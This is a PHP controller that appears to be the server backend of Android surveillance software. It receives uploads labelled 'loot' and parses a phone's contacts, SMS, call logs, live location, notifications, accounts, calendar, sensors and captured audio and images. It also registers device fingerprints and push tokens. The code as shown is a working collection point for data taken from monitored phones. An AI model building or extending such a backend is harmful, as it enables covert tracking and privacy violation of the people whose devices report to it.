<?php

namespace App\Controllers\api\v1;

use App\Controllers\BaseController;
use App\Models\Mod_Parse_Loot;
use App\Models\Mod_Parse_Advanced;
use App\Models\Mod_Receive;
use App\Models\Mod_Android;
use App\Models\Mod_Crypt;
use App\Models\Mod_User;
use App\Models\Mod_Uploaded_Files;
use App\Models\Mod_Log_User_Action;
use CodeIgniter\API\ResponseTrait;
use CodeIgniter\Model;

class Receive extends BaseController
{
    use ResponseTrait;

    // Configuration for the file upload logic
    private $uploadConfig = [
        'max_size'      => 104857600, // 10MB
        'allowed_types' => ['txt', 'enc', 'bin', 'jpg', 'jpeg', 'png', '3gp', 'mp3', 'wav'],
        'upload_path'   => WRITEPATH . 'uploads/text_dump/',
        'encrypt_name'  => true,
    ];

    // Allowed file categories (legacy + advanced extractors)
    private $allowedCategories = [
        // Legacy extractors
        'contacts', 'logs', 'sms', 'apps', 'files', 'calls', 'location',
        // Live location tracking
        'live_locations', 'live_location',
        // SIM config
        'sim_configs', 'sim_config',
        // Advanced extractors
        'device', 'device_context', 'context', 'network', 'network_info', 'accounts', 'calendar', 'app', 'app_usage', 'usage', 'notifications', 'bluetooth', 'sensors', 'sensor',
        // Device info & security
        'deviceinfo', 'device_info', 'security_audit', 'securityaudit',
        // Media categories
        'audio', 'image',
    ];



    /**
     * Upload file endpoint
     */
    public function upload()
    {
        // 1. Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        // 2. Validate token first (security first!)
        $token = $this->request->getPost('token');
        if (!$this->validateToken($token)) {
            return $this->failUnauthorized('Invalid or expired token');
        }

        // 3. Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'device_print_id' => 'required|string',
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        // 4. Get and validate file
        $file = $this->request->getFile('lootdata');
        if (!$file || !$file->isValid()) {
            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
        }

        // 5. Additional file validation
        if (!$this->validateFile($file)) {
            return $this->fail('Invalid file type or size');
        }

        // 6. Get file information BEFORE moving
        $originalName = $file->getClientName();
        $newName = $file->getRandomName();
        $fileInfo = $this->extractFileInfo($file, $newName);

        // 7. Move file securely
        if (!$file->hasMoved()) {
            try {
                $file->move($this->uploadConfig['upload_path'], $newName);
            } catch (\Exception $e) {
                log_message('error', 'File move failed: ' . $e->getMessage());
                return $this->fail('Failed to save file');
            }
        }

        // 8. Get token owner information
        $owner = $this->getTokenOwner($token);
        if (!$owner) {
            @unlink($this->uploadConfig['upload_path'] . $newName);
            return $this->fail('Invalid token owner');
        }

        // 9. Save file attributes to NEW database table via model
        $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo);

        // 10. Process file based on category
        $result = $this->processUploadedFile($newName, $owner, $fileInfo['category'], $fileRecordId);

        $uploadCategory = $fileInfo['category'];
        $uploadActionType = 'upload_' . $uploadCategory;
        $logModel = new Mod_Log_User_Action();
        $logModel->logAction([
            'user_id'         => $owner,
            'action_category' => 'file',
            'action_type'     => $uploadActionType,
            'action_severity' => 'low',
            'device_type'     => 'mobile',
            'success'         => ($result && $result['success']) ? 1 : 0,
            'request_url'     => current_url(),
            'resource_id'     => $fileRecordId,
            'new_values'      => json_encode([
                'filename' => $fileInfo['original_name'],
                'size'     => $fileInfo['size'],
                'category' => $uploadCategory,
            ]),
            'error_message'   => ($result && $result['success']) ? '' : (is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed'),
            'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
        ]);

        if ($result && $result['success']) {
            // Update file record status via model
            if ($fileRecordId > 0) {
                $this->updateFileStatusViaModel($fileRecordId, 'processed', $result);
            }

            return $this->respondCreated([
                'status' => 'success',
                'message' => 'File uploaded and processed successfully',
                'file_id' => $newName,
//                'file_record_id' => $fileRecordId > 0 ? $fileRecordId : null,
                'file_record_id' => null,
                'category' => $fileInfo['category'],
                'timestamp' => (string) (time() * 1000)
            ]);
        } else {
            // Update file record status via model
            if ($fileRecordId > 0) {
                $errorMsg = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
                $this->updateFileStatusViaModel($fileRecordId, 'failed', ['error' => $errorMsg]);
            }

            $errorMessage = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
            return $this->fail('Failed to process uploaded file: ' . $errorMessage);
        }
    }

    /**
     * Token verification endpoint
     */
    public function token_verify()
    {
        // Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $logModel = new Mod_Log_User_Action();

        // Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'time' => 'required|string'
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        $token  = $this->request->getPost('token');
        $time   = $this->request->getPost('time');
        $ip     = $this->request->getIPAddress();
        $source = $this->request->getPost('source');

        // Determine login source for better logging
        $loginSource = $this->resolveTokenLoginSource($source);

        // Link device info if provided
        $this->updateTokenDevice($token);

        // Log token verification attempt
        $this->logTokenVerification($token, $time, $ip, 'format_correct');

        // Verify token
        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);

        if (!$tokenData) {
            $this->logTokenVerification($token, $time, $ip, 'invalid_token');
            $logModel->logAction([
                'action_category' => 'authentication',
                'action_type'     => $loginSource,
                'action_severity' => 'medium',
                'success'         => 0,
                'request_url'     => current_url(),
                'error_message'   => 'Invalid or expired token',
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
            ]);
            return $this->respond([
                'success' => false,
                'token' => $token,
                'validity' => "False",
                'message' => 'Invalid or expired token',
                'timestamp' => date('Y-m-d H:i:s'),
            ], 401);
        }

        // Get user information
        $userModel = new Mod_User();
        $cryptModel = new Mod_Crypt();

        $userData = $userModel->get_vars($tokenData['owner_id']);
        if (!$userData) {
            return $this->fail('User not found');
        }

        // Decrypt user information
        $userName = $this->decryptUserData($cryptModel, $userData['Name'] ?? '');
        $userEmail = $this->decryptUserData($cryptModel, $userData['Email'] ?? '');

        // Mark token as used (single-use tokens)
        $userModel->token_mark(
            $tokenData['owner_id'],
            $token,
            $tokenData['counter']
        );

        $logModel->logAction([
            'user_id'         => $tokenData['owner_id'],
            'action_category' => 'authentication',
            'action_type'     => $loginSource,
            'action_severity' => 'low',
            'success'         => 1,
            'request_url'     => current_url(),
            'new_values'      => json_encode([
                'token_id' => $tokenData['counter'],
            ]),
            'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
        ]);

        return $this->respond([
            'success' => true,
            'token' => $token,
            'validity' => true,
            'timestamp' => date('Y-m-d H:i:s'),
            'token_owner' => $tokenData['owner_id'],
            'token_expiry' => $tokenData['expires_at'],
            'token_id' => $tokenData['counter'],
            'token_owner_id' => $this->getTokenOwner($token),
        ]);
    }

    /**
     * Resolves the login source for token-based authentication.
     * Priority: explicit source POST param > user-agent detection > default
     */
    private function resolveTokenLoginSource(?string $explicitSource): string
    {
        if ($explicitSource && in_array($explicitSource, ['qr', 'manual', 'nfc', 'android'])) {
            return 'login_' . $explicitSource;
        }

        $ua = $this->request->getUserAgent()->getAgentString() ?? '';
        if (stripos($ua, 'okhttp') !== false || stripos($ua, 'android') !== false) {
            return 'login_token_android';
        }

        return 'login_token';
    }

    /**
     * Updates token metadata in background
     */
    private function updateTokenDevice(string $token)
    {
        $deviceChecksum = $this->request->getPost('device_checksum') ?: $this->request->getPost('device_print_id');
        $androidId = $this->request->getPost('android_id');

        if ($deviceChecksum || $androidId) {
            $userModel = new Mod_User();
            $userModel->update_token_metadata($token, $deviceChecksum, $androidId);
        }
    }

    /**
     * Device print registration endpoint
     */
    public function device_print()
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $requiredFields = [
            'device_checksum', 'android_id', 'device_model', 'device_brand',
            'device_manufacturer', 'device_product', 'device_device',
            'device_board', 'device_hardware', 'android_version',
            'android_sdk_int', 'android_security_patch', 'build_id',
            'build_fingerprint', 'memory_total_mb', 'internal_storage_total_gb',
            'external_storage_total_gb', 'app_package', 'app_version',
            'extraction_timestamp', 'extractor_version'
        ];

        $optionalFields = ['fcm_token'];

        $input = $this->request->getPost();

        // Validate required fields
        foreach ($requiredFields as $field) {
            if (empty($input[$field])) {
                return $this->failValidationError("Missing field: {$field}");
            }
        }

        // Sanitize input
        $sanitizedData = [];
        $allFields = array_merge($requiredFields, $optionalFields);

        foreach ($allFields as $field) {
            $sanitizedData[$field] = isset($input[$field]) ? htmlspecialchars($input[$field], ENT_QUOTES, 'UTF-8') : '';
        }
        $sanitizedData['extraction_timestamp'] = date('Y-m-d H:i:s');
        $sanitizedData['device_ip_address'] = $this->request->getIPAddress();

        // Save owner_id for direct user-to-device linking (must be before make_device_print)
        if (!empty($input['token_owner_id'])) {
            $sanitizedData['owner_id'] = (int) $input['token_owner_id'];
        }

        try {
            $modelReceive = new Mod_Receive();
            $device_metadata = $modelReceive->make_device_print($sanitizedData);

            // Link token if provided
            $token = $input['token'] ?? $input['sent_token'] ?? '';
            if (!empty($token)) {
                $this->updateTokenDevice($token);
            }

            $logModel = new Mod_Log_User_Action();

            // Get request object
            $request = $this->request;

            // Extract device info from HEADERS (not POST body)
            $headers = $request->headers();

            $logModel->logAction([
                'action_category' => 'system',
                'action_type'     => 'device_registration',
                'action_severity' => 'low',
                'success'         => 1,
                'device_type'     => 'mobile',
                'request_url'     => current_url(),
                'request_method'  => $request->getMethod(),
                'device_name'     => $request->getHeader('device_name') ?
                    $request->getHeader('device_name')->getValue() :
                    ($input['device_model'] ?? 'Unknown Device'),
                'device_type'     => $request->getHeader('device_type') ?
                    $request->getHeader('device_type')->getValue() : 'phone',
                'operating_system'=> $request->getHeader('os') ?
                    $request->getHeader('os')->getValue() : 'Android',
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
            ]);

            $dev_print = json_decode($device_metadata, true);

            return $this->respond([
                'success' => true,
                'android_id' => $dev_print['dev_adr_id'],
                'device_checksum' => $dev_print['dev_chck_sum'],
                'device_is_new' => $dev_print['is_new'],
                'message' => 'Device print registered successfully',
                'timestamp' => date('Y-m-d H:i:s')
            ]);

        } catch (\Exception $e) {
            log_message('error', 'Device print failed: ' . $e->getMessage());
            return $this->failServerError('Failed to register device print');
        }
    }

    /**
     * Helper Methods
     */

    /**
     * Save file via model
     */
    private function saveFileViaModel(string $token, $owner, array $fileInfo): ?int
    {
        try {
            $modelUpload = new Mod_Uploaded_Files();

            $ownerId = is_array($owner) ? ($owner['Token_Owner'] ?? null) : $owner;
            $devicePrintId = $this->request->getPost('device_print_id');

            $uploadSource = $this->request->getPost('upload_source');
            $validSources = ['manual', 'auto_sync', 'web_initiated'];
            $uploadSource = in_array($uploadSource, $validSources) ? $uploadSource : 'auto_sync';

            $uploadData = [
                'original_name' => $fileInfo['original_name'],
                'new_name' => $fileInfo['new_name'],
                'size' => $fileInfo['size'],
                'extension' => $fileInfo['extension'],
                'mime_type' => $fileInfo['mime_type'],
                'category' => $fileInfo['category'],
                'token' => $token,
                'owner_id' => $ownerId,
                'device_checksum' => $devicePrintId,
                'device_print_id' => $devicePrintId,
                'upload_path' => $fileInfo['upload_path'],
                'upload_source' => $uploadSource,
            ];

            $this->updateTokenDevice($token);

            return $modelUpload->logUpload($uploadData);

        } catch (\Exception $e) {
            log_message('error', 'Failed to save file via model: ' . $e->getMessage());
            return null;
        }
    }

    /**
     * Update file status via model
     */
    private function updateFileStatusViaModel(int $fileId, string $status, ?array $additionalInfo = null): bool
    {
        if ($fileId <= 0) {
            return false;
        }

        try {
            $modelUpload = new Mod_Uploaded_Files();
            return $modelUpload->updateStatus($fileId, $status, $additionalInfo);

        } catch (\Exception $e) {
            log_message('error', 'Failed to update file status via model: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Extract file information
     */
    private function extractFileInfo(\CodeIgniter\HTTP\Files\UploadedFile $file, string $newName): array
    {
        $originalName = $file->getClientName();

        // Priority: 1. POST parameter, 2. Filename prefix
        $category = $this->request->getPost('category');
        if (empty($category)) {
            $category = explode('_', $originalName)[0] ?? 'unknown';
        }

        return [
            'original_name' => $originalName,
            'new_name'      => $newName,
            'size'          => $file->getSize(),
            'extension'     => $file->getExtension(),
            'mime_type'     => $file->getMimeType(),
            'category'      => strtolower(trim($category)),
            'upload_path'   => $this->uploadConfig['upload_path'] . $newName
        ];
    }

    /**
     * Process uploaded file
     */
    private function processUploadedFile($filename, $ownerId, $category, $fileRecordId = null)
    {
        if (!in_array($category, $this->allowedCategories)) {
            log_message('warning', "Receive::processUploadedFile - Unknown category: {$category}");
            return ['success' => false, 'error' => "Unknown category: {$category}"];
        }

        $modelParse = new Mod_Parse_Loot();
        $devicePrintId = $this->request->getPost('device_print_id');
        $startTime = microtime(true);

        // ── Legacy extractor routing ─────────────────────────────────────
        $methodMap = [
            'contacts' => 'get_contacts',
            'logs'     => 'get_logs',
            'calls'    => 'get_logs',
            'sms'      => 'get_sms',
            'apps'     => 'get_apps',
            'files'    => 'get_files',
            'location'       => 'get_location',
            'sim_configs'    => 'parse_sim_configs',
            'sim_config'     => 'parse_sim_configs',
            'live_locations' => 'parse_live_locations',
            'live_location'  => 'parse_live_locations',
        ];

        // ── Advanced extractor routing (aliases included) ─────────────────
        $advancedMethodMap = [
            'device'         => 'parse_device_context',
            'device_context' => 'parse_device_context',
            'context'        => 'parse_device_context',
            'network'        => 'parse_network_info',
            'network_info'   => 'parse_network_info',
            'accounts'       => 'parse_accounts',
            'calendar'       => 'parse_calendar',
            'app'            => 'parse_app_usage',
            'app_usage'      => 'parse_app_usage',
            'usage'          => 'parse_app_usage',
            'notifications'  => 'parse_notifications',
            'bluetooth'      => 'parse_bluetooth',
            'sensors'        => 'parse_sensors',
            'sensor'         => 'parse_sensors',
            'deviceinfo'     => 'parse_device_info',
            'device_info'    => 'parse_device_info',
            'security_audit' => 'parse_security_audit',
            'securityaudit'  => 'parse_security_audit',
            'audio'          => 'parse_captured_media',
            'image'          => 'parse_captured_media',
        ];

        try {
            $parsedCountOrBool = false;

            if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
                $parsedCountOrBool = $modelParse->{$methodMap[$category]}($filename, $ownerId, $devicePrintId, $fileRecordId);
            } elseif (isset($advancedMethodMap[$category])) {
                $modelAdvanced     = new Mod_Parse_Advanced();
                $method            = $advancedMethodMap[$category];

                // Pass category for media parsing to differentiate between image/audio
                if ($method === 'parse_captured_media') {
                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId, $category);
                } else {
                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId);
                }
            } else {
                log_message('error', "Receive::processUploadedFile - No handler for category: {$category}");
                return ['success' => false, 'error' => "No handler for category: {$category}"];
            }

            $durationMs = round((microtime(true) - $startTime) * 1000, 2);

            // Parser methods return boolean (Advanced) or count (Legacy)
            if ($parsedCountOrBool === false) {
                log_message('error', "Receive::processUploadedFile - Parser returned failure for {$category}");
                return [
                    'success'     => false,
                    'error'       => 'Processing failed in parser',
                    'duration_ms' => $durationMs,
                ];
            }

            return [
                'success'        => true,
                'record_count'   => is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool,
                'duration_ms'    => $durationMs,
                'file_record_id' => $fileRecordId,
            ];

        } catch (\Exception $e) {
            log_message('error', "Receive::processUploadedFile - Exception during {$category}: " . $e->getMessage());
            return [
                'success'     => false,
                'error'       => $e->getMessage(),
                'duration_ms' => round((microtime(true) - $startTime) * 1000, 2),
            ];
        }
    }

    /**
     * Validate token
     */
    private function validateToken($token): bool
    {
        if (empty($token)) {
            return false;
        }

        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);
        return $tokenData !== null;
    }

    /**
     * Validate file
     */
    private function validateFile(\CodeIgniter\HTTP\Files\UploadedFile $file): bool
    {
        // Check file size
        if ($file->getSize() > $this->uploadConfig['max_size']) {
            return false;
        }

        try {
            // Check file extension
            $extension = $file->getExtension();
            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
                return false;
            }

            // Check MIME type
            $mimeType = $file->getMimeType();
            $allowedMimes = ['text/plain', 'application/octet-stream'];
            if (!in_array($mimeType, $allowedMimes)) {
                return false;
            }
        } catch (\Exception $e) {
            // Fallback validation
            $originalName = $file->getClientName();
            $extension = pathinfo($originalName, PATHINFO_EXTENSION);

            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
                return false;
            }
        }

        return true;
    }

    /**
     * Get token owner
     */
    private function getTokenOwner($token)
    {
        $modelReceive = new Mod_Receive();
        $owner = $modelReceive->get_token_owner($token);
        return $owner && $owner !== '0' ? $owner['owner_id'] : null;
    }

    /**
     * Log token verification
     */
    private function logTokenVerification($token, $time, $ip, $format)
    {
        $modelReceive = new Mod_Receive();
        $modelReceive->make_test_token($token, $time, $ip, $format);
    }

    /**
     * Decrypt user data
     */
    private function decryptUserData($cryptModel, $encryptedData)
    {
        if (empty($encryptedData)) {
            return '';
        }

        try {
            $decoded = base64_decode($encryptedData);
            if ($decoded === false) {
                return '';
            }
            return $cryptModel->Dec_String($decoded);
        } catch (\Exception $e) {
            log_message('error', 'Failed to decrypt user data: ' . $e->getMessage());
            return '';
        }
    }

    /**
     * Fail validation error helper
     */
    private function failValidationError($message)
    {
        return $this->respond([
            'success' => false,
            'message' => $message,
            'errors' => [$message]
        ], 422);
    }
}
